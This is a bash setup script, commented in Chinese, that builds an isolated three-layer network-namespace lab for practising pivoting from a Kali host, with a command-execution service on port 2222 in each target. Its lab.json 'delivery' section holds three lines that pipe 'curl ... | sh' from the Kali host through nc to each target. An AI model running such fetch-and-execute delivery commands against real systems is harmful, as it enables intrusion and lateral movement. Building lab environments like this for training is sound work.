#!/usr/bin/env bash
# 隔离三层内网实验环境（Linux network namespace）。
#
# 拓扑：
#   Kali 192.168.121.132 ── hlab-br0 10.10.0.1/24
#        │
#     hlab-hop1  10.10.0.2/24  ·  10.10.10.1/24 (lab1)
#        ├── hlab-t1  10.10.10.10/24   ← 第一层目标
#        └── hlab-hop2 10.10.10.2/24  ·  10.10.20.1/24 (lab2)
#               ├── hlab-t2  10.10.20.10/24 ← 第二层目标
#               └── hlab-hop3 10.10.20.2/24 · 10.10.30.1/24 (lab3)
#                      └── hlab-t3 10.10.30.10/24 ← 第三层目标
#
# 需要 root（创建 netns / veth / 路由）：
#   sudo bash lab/setup_lab.sh
# 清理：
#   sudo bash lab/teardown_lab.sh
set -euo pipefail

LAB_DIR="$(cd "$(dirname "$0")" && pwd)"
RUN_DIR="$LAB_DIR/run"
LOG="$RUN_DIR/setup.log"
VERIFY="$RUN_DIR/verify.txt"
mkdir -p "$RUN_DIR"
: >"$LOG"
exec > >(tee -a "$LOG") 2>&1

[[ ${EUID} -eq 0 ]] || { echo "需要 root：sudo bash $0" >&2; exit 1; }

BR=hlab-br0
HOPS=(hlab-hop1 hlab-hop2 hlab-hop3)
TARGETS=(hlab-t1 hlab-t2 hlab-t3)
ALL=("${HOPS[@]}" "${TARGETS[@]}")

log() { printf '\n[%s] %s\n' "$(date +%H:%M:%S)" "$*"; }

cleanup() {
  for ns in "${TARGETS[@]}" "${HOPS[@]}"; do
    ip netns del "$ns" 2>/dev/null || true
  done
  ip link del "$BR" 2>/dev/null || true
  for r in 10.10.10.0/24 10.10.20.0/24 10.10.30.0/24; do
    ip route del "$r" 2>/dev/null || true
  done
  rm -f "$RUN_DIR"/execd-*.pid
}

log "清理旧的 hlab-* 环境"
cleanup

log "创建网桥与 network namespace"
ip link add "$BR" type bridge
ip addr add 10.10.0.1/24 dev "$BR"
ip link set "$BR" up
for ns in "${ALL[@]}"; do
  ip netns add "$ns"
  ip -n "$ns" link set lo up
  ip netns exec "$ns" sysctl -qw net.ipv4.ip_forward=1
done
sysctl -qw net.ipv4.ip_forward=1

log "Kali <-> hop1"
ip link add hlab-k0 type veth peer name hlab-h0
ip link set hlab-k0 master "$BR" up
ip link set hlab-h0 netns hlab-hop1
ip -n hlab-hop1 link set hlab-h0 name eth0
ip -n hlab-hop1 addr add 10.10.0.2/24 dev eth0
ip -n hlab-hop1 link set eth0 up

log "hop1 <-> hop2（lab1: 10.10.10.0/24）"
ip link add hlab-p1a type veth peer name hlab-p1b
ip link set hlab-p1a netns hlab-hop1
ip link set hlab-p1b netns hlab-hop2
ip -n hlab-hop1 link set hlab-p1a name eth1
ip -n hlab-hop2 link set hlab-p1b name eth0
ip -n hlab-hop2 addr add 10.10.10.2/24 dev eth0
ip -n hlab-hop2 link set eth0 up
ip -n hlab-hop1 link add br1 type bridge
ip -n hlab-hop1 addr add 10.10.10.1/24 dev br1
ip -n hlab-hop1 link set br1 up
ip -n hlab-hop1 link set eth1 master br1 up

log "hop2 <-> hop3（lab2: 10.10.20.0/24）"
ip link add hlab-p2a type veth peer name hlab-p2b
ip link set hlab-p2a netns hlab-hop2
ip link set hlab-p2b netns hlab-hop3
ip -n hlab-hop2 link set hlab-p2a name eth1
ip -n hlab-hop3 link set hlab-p2b name eth0
ip -n hlab-hop3 addr add 10.10.20.2/24 dev eth0
ip -n hlab-hop3 link set eth0 up
ip -n hlab-hop2 link add br2 type bridge
ip -n hlab-hop2 addr add 10.10.20.1/24 dev br2
ip -n hlab-hop2 link set br2 up
ip -n hlab-hop2 link set eth1 master br2 up

log "hop1 <-> t1（lab1 目标）"
ip link add hlab-t1a type veth peer name hlab-t1b
ip link set hlab-t1a netns hlab-hop1
ip link set hlab-t1b netns hlab-t1
ip -n hlab-hop1 link set hlab-t1a name eth2
ip -n hlab-hop1 link set eth2 master br1 up
ip -n hlab-t1 link set hlab-t1b name eth0
ip -n hlab-t1 addr add 10.10.10.10/24 dev eth0
ip -n hlab-t1 link set eth0 up

log "hop2 <-> t2（lab2 目标）"
ip link add hlab-t2a type veth peer name hlab-t2b
ip link set hlab-t2a netns hlab-hop2
ip link set hlab-t2b netns hlab-t2
ip -n hlab-hop2 link set hlab-t2a name eth2
ip -n hlab-hop2 link set eth2 master br2 up
ip -n hlab-t2 link set hlab-t2b name eth0
ip -n hlab-t2 addr add 10.10.20.10/24 dev eth0
ip -n hlab-t2 link set eth0 up

log "hop3 <-> t3（lab3 目标）"
ip link add hlab-t3a type veth peer name hlab-t3b
ip link set hlab-t3a netns hlab-hop3
ip link set hlab-t3b netns hlab-t3
ip -n hlab-hop3 link set hlab-t3a name eth1
ip -n hlab-hop3 link add br3 type bridge
ip -n hlab-hop3 addr add 10.10.30.1/24 dev br3
ip -n hlab-hop3 link set br3 up
ip -n hlab-hop3 link set eth1 master br3 up
ip -n hlab-t3 link set hlab-t3b name eth0
ip -n hlab-t3 addr add 10.10.30.10/24 dev eth0
ip -n hlab-t3 link set eth0 up

log "路由与默认网关"
ip route replace 10.10.10.0/24 via 10.10.0.2 dev "$BR"
ip route replace 10.10.20.0/24 via 10.10.0.2 dev "$BR"
ip route replace 10.10.30.0/24 via 10.10.0.2 dev "$BR"

ip -n hlab-hop1 route replace default via 10.10.0.1
ip -n hlab-hop1 route replace 10.10.20.0/24 via 10.10.10.2
ip -n hlab-hop1 route replace 10.10.30.0/24 via 10.10.10.2
ip -n hlab-hop2 route replace default via 10.10.10.1
ip -n hlab-hop2 route replace 10.10.30.0/24 via 10.10.20.2
ip -n hlab-hop3 route replace default via 10.10.20.1
ip -n hlab-t1 route replace default via 10.10.10.1
ip -n hlab-t2 route replace default via 10.10.20.1
ip -n hlab-t3 route replace default via 10.10.30.1

log "启动目标侧命令执行服务（execd，:2222）"
for ns in "${TARGETS[@]}"; do
  short="${ns#hlab-}"
  ip netns exec "$ns" nohup python3 "$LAB_DIR/execd.py" --port 2222 \
      --log "$RUN_DIR/execd-$short.log" >/dev/null 2>&1 &
  echo $! >"$RUN_DIR/execd-$short.pid"
done
sleep 0.8

log "写入实验拓扑与投递命令"
cat >"$RUN_DIR/lab.json" <<JSON
{
  "created": "$(date -Iseconds)",
  "kali": "192.168.121.132",
  "bridge": {"name": "$BR", "addr": "10.10.0.1/24"},
  "layers": [
    {"layer": 1, "segment": "10.10.10.0/24", "router": "hlab-hop1 10.10.10.1", "target": "10.10.10.10"},
    {"layer": 2, "segment": "10.10.20.0/24", "router": "hlab-hop2 10.10.20.1", "target": "10.10.20.10"},
    {"layer": 3, "segment": "10.10.30.0/24", "router": "hlab-hop3 10.10.30.1", "target": "10.10.30.10"}
  ],
  "delivery": {
    "layer1_from_existing_session": "printf '%s\\\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.10.10 2222",
    "layer2_from_layer1_session": "printf '%s\\\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.20.10 2222",
    "layer3_from_layer2_session": "printf '%s\\\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.30.10 2222"
  }
}
JSON

log "连通性验收（写入 $VERIFY）"
{
  echo "== Kali -> 三层目标 =="
  for ip in 10.10.10.10 10.10.20.10 10.10.30.10; do
    printf '\n--- %s ---\n' "$ip"
    ping -c 2 -W 1 "$ip" || true
  done
  echo
  echo "== execd 命令通道 =="
  for ip in 10.10.10.10 10.10.20.10 10.10.30.10; do
    printf '\n--- %s:2222 ---\n' "$ip"
    printf 'hostname; ip -brief addr; ip route\n' | nc -w 5 "$ip" 2222 || true
  done
  echo
  echo "== 各命名空间地址 =="
  for ns in "${ALL[@]}"; do
    printf '\n--- %s ---\n' "$ns"
    ip -n "$ns" -brief addr
    ip -n "$ns" route
  done
  echo
  echo "== 层间路由（t1 -> t3 / t3 -> t1）=="
  ip netns exec hlab-t1 ip route get 10.10.30.10 || true
  ip netns exec hlab-t3 ip route get 10.10.10.10 || true
  printf '\n--- t1 -> t3 ping ---\n'
  ip netns exec hlab-t1 ping -c 2 -W 1 10.10.30.10 || true
  printf '\n--- t3 -> t1 ping ---\n'
  ip netns exec hlab-t3 ping -c 2 -W 1 10.10.10.10 || true
} >"$VERIFY" 2>&1

log "完成。拓扑：lab/run/lab.json；验收：lab/run/verify.txt"
sed -n '1,60p' "$VERIFY" || true
